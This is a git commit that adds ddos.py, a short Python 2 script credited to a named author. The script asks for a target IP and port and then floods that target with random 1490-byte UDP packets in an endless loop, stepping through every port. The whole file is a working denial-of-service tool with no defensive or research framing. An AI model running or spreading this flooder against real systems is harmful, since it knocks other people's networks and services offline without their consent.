172799155fe34e02152ec6549f6345a53007b15b
Seyed Ali Javadi Moghadam <42797703+javadimoghadam@users.noreply.github.com>
2020-03-13 19:23:06 +0330

    Add Source File

---
+++ ddos.py
@@ -0,0 +1,29 @@
+import sys
+import os
+import time
+import socket
+import random
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet Ali Ddos")
+print
+print "Author : Ali Javadi"
+print "github : https://github.com/javadimoghadam"
+print
+ip = raw_input("Target\'s IP : ")
+port = input("Port : ")
+os.system("clear")
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
+
